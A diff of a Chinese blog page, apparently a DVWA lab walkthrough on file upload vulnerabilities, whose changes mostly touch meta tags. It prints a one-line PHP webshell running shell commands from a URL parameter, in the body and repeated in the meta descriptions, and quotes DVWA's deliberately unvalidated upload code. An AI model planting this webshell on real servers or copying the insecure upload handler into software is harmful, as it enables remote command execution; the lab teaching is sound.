@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。 这里我们先新建一个php文件，插入一句话木马，文件内容如下： 1&amp;lt;?php echo shell_exec($_GET[&amp;apos;cmd&amp;apos;]);?&amp;gt;  Low等级Low等">
+<meta name="description" content="文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。 这里我们先新建一个php文件，插入一句话木马，文件内容如下： 1&amp;lt;?php echo shell_exec($_GET[&amp;apos;cmd&amp;apos;]);?&amp;gt;">
 <meta name="keywords" content="DVWA">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DVWA 文件上传">
 <meta property="og:url" content="http://nickzhoulin.github.io/2017/11/19/page171118/index.html">
 <meta property="og:site_name" content="想念初恋">
-<meta property="og:description" content="文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。 这里我们先新建一个php文件，插入一句话木马，文件内容如下： 1&amp;lt;?php echo shell_exec($_GET[&amp;apos;cmd&amp;apos;]);?&amp;gt;  Low等级Low等">
+<meta property="og:description" content="文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。 这里我们先新建一个php文件，插入一句话木马，文件内容如下： 1&amp;lt;?php echo shell_exec($_GET[&amp;apos;cmd&amp;apos;]);?&amp;gt;">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171118-01.JPG">
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171118-02.JPG">
@@ -93,10 +93,10 @@
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171118-04.JPG">
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171118-05.JPG">
 <meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20171118-06.JPG">
-<meta property="og:updated_time" content="2017-11-19T14:42:49.803Z">
+<meta property="og:updated_time" content="2017-11-19T14:45:02.188Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DVWA 文件上传">
-<meta name="twitter:description" content="文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。 这里我们先新建一个php文件，插入一句话木马，文件内容如下： 1&amp;lt;?php echo shell_exec($_GET[&amp;apos;cmd&amp;apos;]);?&amp;gt;  Low等级Low等">
+<meta name="twitter:description" content="文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。 这里我们先新建一个php文件，插入一句话木马，文件内容如下： 1&amp;lt;?php echo shell_exec($_GET[&amp;apos;cmd&amp;apos;]);?&amp;gt;">
 <meta name="twitter:image" content="http://oz3okd76o.bkt.clouddn.com/20171118-01.JPG">
 
 
@@ -352,6 +352,7 @@
         <p>文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。文件上传漏洞，简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。</p>
 <p>这里我们先新建一个php文件，插入一句话木马，文件内容如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;</div></pre></td></tr></table></figure>
+<a id="more"></a>
 <p><img src="http://oz3okd76o.bkt.clouddn.com/20171118-01.JPG" alt=""></p>
 <h4 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h4><p>Low等级的代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</div><div class="line">    // Where are we going to be writing to?</div><div class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</div><div class="line">    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</div><div class="line"></div><div class="line">    // Can we move the file to the upload folder?</div><div class="line">    if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;</div><div class="line">        // No</div><div class="line">        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        // Yes!</div><div class="line">        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
